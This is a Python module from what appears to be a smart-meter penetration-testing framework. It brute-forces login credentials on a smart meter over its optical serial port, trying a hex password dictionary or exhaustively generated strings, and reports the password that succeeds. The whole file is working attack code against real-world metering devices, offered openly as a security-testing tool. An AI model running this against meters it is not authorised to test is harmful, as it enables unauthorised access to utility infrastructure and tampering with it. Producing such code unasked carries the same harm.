#  framework/modules/brute_force_login.py
#  
#  Copyright 2011 Spencer J. McIntyre <SMcIntyre [at] SecureState [dot] net>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.

from framework.templates import optical_module_template
from framework.utils import StringGenerator
from binascii import unhexlify
from time import sleep
import os
import re

class BruteForce:
	def __init__(self, dictionary_path = None):
		if dictionary_path == None:
			self.dictionary = None
		else:
			self.dictionary = open(dictionary_path, 'r')
	
	def __iter__(self):
		if self.dictionary == None:
			for password in StringGenerator(20):
				yield password
		else:
			password = self.dictionary.readline()
			while password:
				yield password
				password = self.dictionary.readline()
			self.dictionary.close()
		raise StopIteration

class Module(optical_module_template):
	def __init__(self, *args, **kwargs):
		optical_module_template.__init__(self, *args, **kwargs)
		self.version = 3
		self.author = [ 'Spencer McIntyre <smcintyre@securestate.net>' ]
		self.description = 'Brute Force Credentials'
		self.detailed_description = 'This module is used for brute forcing credentials on the smart meter.  Passwords are not limited to ASCII values and in order to test the entire character space the user will have to provide a dictionary of hex strings and set USEHEX to true.'
		self.options.addBoolean('USEHEX', 'values in word list are in hex', default = True)
		self.options.addRFile('DICTIONARY', 'dictionary of passwords to try', required = False, default = '$DATA_PATH smeter_passwords.txt')
		self.options.addString('USERNAME', 'user name to attempt to log in as', default = '0000')
		self.options.addInteger('USERID', 'user id to attempt to log in as', default = 1)
		
		self.advanced_options.addBoolean('PUREBRUTE', 'perform a pure bruteforce', default = False)
		self.advanced_options.addBoolean('STOPONSUCCESS', 'stop after the first successful login', default = True)
		self.advanced_options.addFloat('DELAY', 'time in seconds to wait between attempts', default = 0.20)
	
	def run(self):
		conn = self.frmwk.serial_connection
		logger = self.logger
		usehex = self.options.getOptionValue('USEHEX')
		dictionary_path = self.options.getOptionValue('DICTIONARY')
		username = self.options.getOptionValue('USERNAME')
		userid = self.options.getOptionValue('USERID')
		pure_brute = self.advanced_options.getOptionValue('PUREBRUTE')
		time_delay = self.advanced_options.getOptionValue('DELAY')
		
		if len(username) > 10:
			self.frmwk.print_error('Username cannot be longer than 10 characters')
			return
		if not (0 <= userid <= 0xffff):
			self.frmwk.print_error('User id must be between 0 and 0xffff')
			return
		
		if not pure_brute:
			if not os.path.isfile(dictionary_path):
				self.frmwk.print_error('Can not find dictionary path')
				return
			pw_generator = BruteForce(dictionary_path)
		else:
			self.frmwk.print_status('A pure brute force will take a very very long time')
			usehex = True # if doing a prute brute force, it has to be True
			pw_generator = BruteForce()
		
		hex_regex = re.compile('^([0-9a-fA-F]{2})+$')
		
		self.frmwk.print_status('Starting brute force')
		
		for password in pw_generator:
			if usehex and not pure_brute:
				password = password.strip()
				if hex_regex.match(password) == None:
					logger.error('invalid characters found while searching for hex')
					self.frmwk.print_error('Invalid characters found while searching for hex')
					return
				password = unhexlify(password)
			else:
				password = password.rstrip()
			if len(password) > 20:
				if usehex:
					logger.warning('skipping password: ' + password.encode('hex') + ' due to length (can not be exceed 20 bytes)')
				else:
					logger.warning('skipping password: ' + password + ' due to length (can not be exceed 20 bytes)')
				continue
			while not conn.start():
				sleep(time_delay)
			sleep(time_delay)
			if conn.login(username, userid, password):
				if usehex:
					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password.encode('hex'))
				else:
					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password)
				if self.advanced_options.getOptionValue('STOPONSUCCESS'):
					conn.stop()
					break
			if usehex:
				logger.warning('Failed logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password.encode('hex'))
			else:
				logger.warning('Failed logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password)
			while not conn.stop():
				sleep(time_delay)
			sleep(time_delay)
		return
